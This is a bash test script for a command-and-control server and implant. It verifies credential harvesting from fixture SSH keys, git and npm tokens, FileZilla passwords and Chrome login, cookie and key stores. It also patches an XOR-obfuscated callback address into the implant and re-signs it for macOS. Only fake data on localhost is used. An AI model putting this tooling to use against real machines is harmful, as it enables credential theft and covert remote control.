#!/usr/bin/env bash
# 凭据采集链路端到端验证：全部使用 fixture HOME，不读取真实凭据。
#
#   ./scripts/e2e_creds.sh
#
# 流程：造 fixture（假 SSH 私钥 / .git-credentials / .npmrc / FileZilla / 假
# Chrome 配置目录）→ 起 server + implant → 触发 browser.deep 与 creds 采集 →
# 校验脱敏、reveal、CSV 导出、去重与删除。
#
# 注意：需要 sqlite3（造库）、curl（健康检查）与 python3（驱动）。macOS arm64
# 上补丁过的二进制必须重新 ad-hoc 签名，否则内核直接 SIGKILL。
set -euo pipefail

ROOT="$(cd "$(dirname "$0")/.." && pwd)"
E2E="$(mktemp -d /tmp/c2e2e.XXXXXX)"
HOME_DIR="$E2E/home"
WORK="$E2E/work"
free_port() { python3 -c 'import socket;s=socket.socket();s.bind(("127.0.0.1",0));print(s.getsockname()[1]);s.close()'; }
WEB_PORT="${WEB_PORT:-$(free_port)}"
IMPLANT_PORT="${IMPLANT_PORT:-$(free_port)}"
PASS="fixture-pass"
SRV_PID=""
IMP_PID=""
RC=1

cleanup() {
  [ -n "$IMP_PID" ] && kill "$IMP_PID" 2>/dev/null || true
  [ -n "$SRV_PID" ] && kill "$SRV_PID" 2>/dev/null || true
  sleep 0.2
  [ -n "$IMP_PID" ] && kill -9 "$IMP_PID" 2>/dev/null || true
  [ -n "$SRV_PID" ] && kill -9 "$SRV_PID" 2>/dev/null || true
  if [ "${KEEP:-}" = "1" ]; then
    echo "kept $E2E"
  else
    rm -rf "$E2E"
  fi
}
trap cleanup EXIT

echo "== 1. fixture =="
mkdir -p "$HOME_DIR/.ssh" "$HOME_DIR/.config/filezilla" "$WORK" \
         "$HOME_DIR/Library/Application Support/Google/Chrome/Default"
printf -- '-----BEGIN OPENSSH PRIVATE KEY-----\nFAKEKEYMATERIAL0000\n-----END OPENSSH PRIVATE KEY-----\n' \
  > "$HOME_DIR/.ssh/id_ed25519"
printf 'https://deploy:ghp_fixturetoken123456@git.example.com\n' > "$HOME_DIR/.git-credentials"
printf '//registry.npmjs.org/:_authToken=npm_FAKE0123456789abcdef\n' > "$HOME_DIR/.npmrc"
cat > "$HOME_DIR/.config/filezilla/recentservers.xml" <<'XML'
<FileZilla3><Servers><Server>
  <Host>ftp.example.com</Host><Port>21</Port>
  <User>ftpuser</User><Pass>Zml4dHVyZXBhc3M=</Pass>
</Server></Servers></FileZilla3>
XML

CHROME="$HOME_DIR/Library/Application Support/Google/Chrome"
sqlite3 "$CHROME/Default/Login Data" <<'SQL'
create table logins(origin_url text, username_value text, password_value blob, times_used int, date_created int);
insert into logins values('https://portal.example.com','alice@example.com', x'7631300011223344556677', 5, 13300000000000000);
SQL
sqlite3 "$CHROME/Default/Cookies" <<'SQL'
create table cookies(host_key text, name text, encrypted_value blob, expires_utc int);
insert into cookies values('.example.com','sid', x'763130AABBCCDDEEFF0011', 13300000000000000);
SQL
sqlite3 "$CHROME/Default/Web Data" <<'SQL'
create table autofill(name text, value text);
insert into autofill values('email','alice@example.com');
SQL
printf '{"profile":{"name":"Work","account_info":[{"email":"alice@example.com"}]}}' \
  > "$CHROME/Default/Preferences"
printf '{"os_crypt":{"encrypted_key":"RFBBUEkBAAAA0Iyd3wEV0RGMegDAT8KX6wEAAAC"}}' \
  > "$CHROME/Local State"
printf '3\n' > "$CHROME/Last Version"

echo "== 2. build =="
( cd "$ROOT" && go build -o "$E2E/server" ./cmd/server && go build -o "$E2E/implant" ./cmd/implant )
python3 - "$E2E/implant" "$IMPLANT_PORT" <<'PATCH'
import sys
path, port = sys.argv[1], sys.argv[2]
host, key = "127.0.0.1", 0x5A
data = bytearray(open(path, "rb").read())
i = data.find(b"C2PATCH!")
if i < 0:
    sys.exit("payload patch site missing")
data[i + 8] = key
data[i + 9:i + 72] = b"\0" * 63
data[i + 72:i + 80] = b"\0" * 8
enc = bytes(c ^ key for c in host.encode())
data[i + 9:i + 9 + len(enc)] = enc
encp = bytes(c ^ key for c in port.encode())
data[i + 72:i + 72 + len(encp)] = encp
open(path, "wb").write(data)
print(f"patched implant -> {host}:{port}")
PATCH
if command -v codesign >/dev/null 2>&1; then
  codesign --force --sign - "$E2E/implant" >/dev/null 2>&1 || true
fi
printf 'web_title=e2e\nweb_ip=127.0.0.1\nweb_port=%s\nweb_username=admin\nweb_password=%s\nweb_jwt_secret=\nlog_level=3\n' \
  "$WEB_PORT" "$PASS" > "$E2E/setting.conf"

echo "== 3. start =="
( cd "$WORK"; exec "$E2E/server" -config "$E2E/setting.conf" > "$E2E/server.log" 2>&1 ) &
SRV_PID=$!
for _ in $(seq 60); do
  curl -fsS "http://127.0.0.1:$WEB_PORT/" -o /dev/null 2>/dev/null && break
  sleep 0.2
done
if ! kill -0 "$SRV_PID" 2>/dev/null; then
  echo "server died:"; tail -5 "$E2E/server.log"; exit 1
fi
HOME="$HOME_DIR" "$E2E/implant" > "$E2E/implant.log" 2>&1 &
IMP_PID=$!
sleep 1

echo "== 4. drive =="
python3 - "$WEB_PORT" "$PASS" "$IMPLANT_PORT" "$E2E/implant.log" <<'PY'
import json, sys, time, urllib.request

port, password, implant_port, imp_log = sys.argv[1], sys.argv[2], int(sys.argv[3]), sys.argv[4]
base = f"http://127.0.0.1:{port}"
token = ""

def call(method, path, body=None, raw=False):
    data = None if body is None else json.dumps(body).encode()
    req = urllib.request.Request(base + path, data=data, method=method)
    if data:
        req.add_header("Content-Type", "application/json")
    if token:
        req.add_header("Authorization", "Bearer " + token)
    with urllib.request.urlopen(req, timeout=20) as r:
        payload = r.read()
        return payload if raw else json.loads(payload or b"null")

def fail(msg):
    print("FAIL:", msg)
    try:
        print("implant log:", open(imp_log).read()[:800] or "(empty)")
    except OSError:
        pass
    sys.exit(1)

token = call("POST", "/api/login", {"username": "admin", "password": password})["token"]
print("login ok")

call("POST", "/api/listeners", {"name": "e2e", "bind": "127.0.0.1", "port": implant_port})
print(f"listener 127.0.0.1:{implant_port}")

sid = host = None
for _ in range(60):
    rows = call("GET", "/api/sessions")
    if rows:
        sid = rows[0]["id"]
        host = rows[0]["hostname"]
        break
    time.sleep(0.25)
if not sid:
    fail("implant never registered")
print("session", sid, "host", host)

def run_task(path, body, label):
    tid = call("POST", path, body)["task_id"]
    for _ in range(150):
        t = call("GET", f"/api/sessions/{sid}/tasks/{tid}")
        if t["error"]:
            fail(f"{label} task error: {t['error']}")
        if t["done"]:
            print(f"{label}: done, {t.get('size')} bytes streamed")
            return
        time.sleep(0.1)
    fail(f"{label} timed out")

run_task(f"/api/sessions/{sid}/creds", {"scope": "all"}, "creds(all)")
run_task(f"/api/sessions/{sid}/browser/deep", {}, "browser.deep")

view = None
for _ in range(40):
    view = call("GET", f"/api/creds/{host}")
    if view["stats"]["total"] > 0:
        break
    time.sleep(0.25)
print("stats", view["stats"])
print("kinds", view["kinds"], "sources", view["sources"])
for it in view["items"]:
    print(f"  {it['kind']} {it['source']:<10} {it['target'][:40]:<40} user={it['user'][:20]:<20} secret={it['secret']:<12} has={it['has_secret']}")

if view["stats"]["total"] == 0:
    fail("collection produced no rows")

raw = call("GET", f"/api/creds/{host}", raw=True).decode()
leaks = [s for s in ("ghp_fixturetoken123456", "FAKEKEYMATERIAL", "fixturepass",
                     "npm_FAKE0123456789abcdef") if s in raw]
if leaks:
    fail(f"plaintext in list response: {leaks}")
print("masking ok: no plaintext in the list response")

by_kind = {}
for it in view["items"]:
    by_kind.setdefault(it["kind"], []).append(it)
for kind, want in (("G", "ghp_fixturetoken123456"), ("K", "FAKEKEYMATERIAL"), ("F", "fixturepass")):
    if kind not in by_kind:
        fail(f"missing {kind} row")
    got = call("POST", f"/api/creds/{host}/reveal", {"ids": [by_kind[kind][0]["id"]]})["secrets"]
    val = got.get(by_kind[kind][0]["id"], "")
    if kind == "K":
        import base64
        try:
            val = base64.b64decode(val).decode()
        except Exception:
            pass
    if want not in val:
        fail(f"reveal {kind} wrong: {val!r}")
print("reveal ok for git/ssh/ftp")

csv = call("GET", f"/api/creds/{host}/export", raw=True).decode("utf-8-sig")
for want in ("ghp_fixturetoken123456", "浏览器账号", "WiFi"):
    if want not in csv and want != "WiFi":
        fail(f"csv missing {want!r}")
if "SSH 私钥" not in csv:
    fail("csv missing localized kind label")
print("csv export ok, rows:", csv.count("\n") - 1)

before = view["stats"]["total"]
run_task(f"/api/sessions/{sid}/creds", {"scope": "all"}, "creds(again)")
time.sleep(0.6)
again = call("GET", f"/api/creds/{host}")
if again["stats"]["total"] != before:
    fail(f"dedupe broken: {before} -> {again['stats']['total']}")
print("dedupe ok:", before, "rows stable")

call("DELETE", f"/api/creds/{host}")
if call("GET", f"/api/creds/{host}")["stats"]["total"] != 0:
    fail("delete left data")
print("delete ok")
PY
RC=$?

echo "== 5. tail =="
tail -2 "$E2E/implant.log" 2>/dev/null || true
[ "$RC" -eq 0 ] && echo PASS
exit "$RC"
